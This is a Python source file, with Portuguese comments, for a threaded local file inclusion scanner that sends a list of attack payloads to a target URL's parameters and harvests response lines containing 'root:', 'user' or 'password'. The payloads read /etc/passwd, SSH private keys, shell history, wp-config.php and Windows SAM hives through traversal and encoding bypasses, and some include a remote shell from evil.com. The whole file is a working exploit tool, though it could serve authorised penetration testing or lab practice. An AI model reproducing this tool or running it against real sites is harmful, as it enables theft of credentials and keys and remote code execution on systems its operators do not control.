import requests
import urllib.parse
import concurrent.futures
import time
import argparse
from tqdm import tqdm

# Função para exibir o banner e créditos
def show_banner():
    print("\033[1;33m============================================\033[0m")
    print("\033[1;33m           🕵️‍♂️ Spoo1k's LFI Tool           \033[0m")
    print("\033[1;33m============================================\033[0m")
    print("\033[1;36mDesenvolvido por spoo1k \033[0m")
    print("\033[1;33m============================================\033[0m\n")

# Função para exibir a ajuda
def show_help():
    show_banner()
    print("Uso: python3 lfi_explorer.py <target-url> [--wP <wordlist>] [--wc <ignore-code>]")
    print("")
    print("Argumentos:")
    print("  <target-url>    URL alvo a ser testada para vulnerabilidades LFI")
    print("  --wP <wordlist> Caminho para o arquivo de wordlist com os parâmetros a serem testados")
    print("  --wc <ignore-code> Código de status HTTP a ser ignorado")
    print("")
    print("Exemplo:")
    print("  python3 lfi_explorer.py http://10.14.0.226/login.php --wP params.txt --wc 200")
    print("")
    print("Este script testa várias vulnerabilidades LFI usando diferentes parâmetros e payloads.")
    print("Os resultados encontrados são exibidos e também salvos em um arquivo chamado 'resultados.txt'.")
    exit(0)

# Função para carregar a wordlist de parâmetros
def load_wordlist(filepath):
    with open(filepath, 'r') as file:
        return [line.strip() for line in file]

# Lista de payloads
PAYLOADS = [
    # Linux
    "../../../../../../../../etc/passwd",
    "../../../../../../../../var/www/html/index.php",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../proc/version",
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/apache2/error.log",
    "../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../var/log/nginx/error.log",
    "../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../etc/nginx/nginx.conf",
    "../../../../../../../../etc/ssh/sshd_config",
    "../../../../../../../../etc/mysql/my.cnf",
    "../../../../../../../../etc/php/7.4/apache2/php.ini",
    "../../../../../../../../var/www/html/config.php",
    "../../../../../../../../var/www/html/wp-config.php",
    "../../../../../../../../.bash_history",
    "../../../../../../../../.ssh/id_rsa",
    "../../../../../../../../.git/config",
    # Windows
    "../../../../../../../../boot.ini",
    "../../../../../../../../windows/win.ini",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../../../windows/system32/config/sam",
    "../../../../../../../../windows/system32/config/system",
    "../../../../../../../../windows/system32/config/software",
    "../../../../../../../../windows/system32/config/security",
    "../../../../../../../../windows/system32/config/default",
    # Null Byte
    "../../../../../../../../etc/passwd%00",
    "../../../../../../../../var/www/html/index.php%00",
    # Double Encoding
    "../../../../../../../../etc/passwd%252e%252e%252e%252e%252f",
    "../../../../../../../../var/www/html/index.php%252e%252e%252f",
    # UTF-8 Encoding
    "../../../../../../../../etc/passwd%E0%A4%80",
    "../../../../../../../../var/www/html/index.php%E0%A4%80",
    # Path Truncation
    "../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../var/www/html/index.php",
    # Filter Bypass
    "../../../../../../../../.../././etc/passwd",
    "../../../../../../../../.../././var/www/html/index.php",
    # Remote File Inclusion
    "http://evil.com/shell.txt",
    "http://evil.com/shell.txt?",
    # Null Byte in RFI
    "http://evil.com/shell.txt%00",
    "http://evil.com/shell.txt?",
    # Double Encoding in RFI
    "http://evil.com/shell.txt%252e%252e%252f",
    "http://evil.com/shell.txt%252e%252e%252f",
    # Bypass allow_url_include
    "php://filter/resource=http://evil.com/shell.txt",
    "php://filter/resource=http://evil.com/shell.txt"
]

def test_lfi(target, param, payload, ignore_code):
    encoded_payload = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded_payload}"
    response = requests.get(url)
    if response.status_code == ignore_code:
        return False
    if response.status_code == 200:
        response_lines = response.text.splitlines()
        relevant_lines = [line for line in response_lines if "root:" in line or "user" in line.lower() or "password" in line.lower()]
        if relevant_lines:
            with open('resultados.txt', 'a') as f:
                f.write(f"Payload: {payload}, Parâmetro: {param}\n")
                f.write(f"URL: {url}\n")
                for line in relevant_lines:
                    f.write(f"{line}\n")
                f.write("----------------------------------------\n")
            print(f"\033[1;32m\n\nResultados encontrados para payload: {payload} no parâmetro: {param}\033[0m")
            print("\033[1;33m----------------------------------------\033[0m")
            print(f"\033[1;34mURL: {url}\033[0m")
            for line in relevant_lines:
                print(f"\033[1;31m{line}\033[0m")
            print("\033[1;33m----------------------------------------\033[0m")
            return True
    return False

def main(target, wordlist=None, ignore_code=None):
    show_banner()
    print("Iniciando exploração LFI...")

    if wordlist:
        params = load_wordlist(wordlist)
    else:
        params = ["file", "page", "path", "directory", "folder", "doc", "template", "php_path", "pg", "view", "id", "include", "inc"]

    print(f"Total de payloads: {len(PAYLOADS)}")
    print(f"Total de parâmetros: {len(params)}")

    found_urls = 0
    total_tests = len(params) * len(PAYLOADS)
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        with tqdm(total=total_tests, desc="Progresso") as pbar:
            for param in params:
                for payload in PAYLOADS:
                    futures.append(executor.submit(test_lfi, target, param, payload, ignore_code))

            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    found_urls += 1
                pbar.update(1)

    end_time = time.time()
    execution_time = end_time - start_time

    print("\nExploração LFI concluída.")
    print(f"Total de URLs encontradas: {found_urls}")
    print(f"Tempo total de execução: {execution_time:.2f} segundos")
    print(f"Parâmetros encontrados: {found_urls}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploração de vulnerabilidades LFI")
    parser.add_argument('target_url', type=str, help="URL alvo a ser testada para vulnerabilidades LFI")
    parser.add_argument('--wP', type=str, help="Caminho para o arquivo de wordlist com os parâmetros a serem testados")
    parser.add_argument('--wc', type=int, help="Código de status HTTP a ser ignorado")
    
    args = parser.parse_args()
    main(args.target_url, args.wP, args.wc)
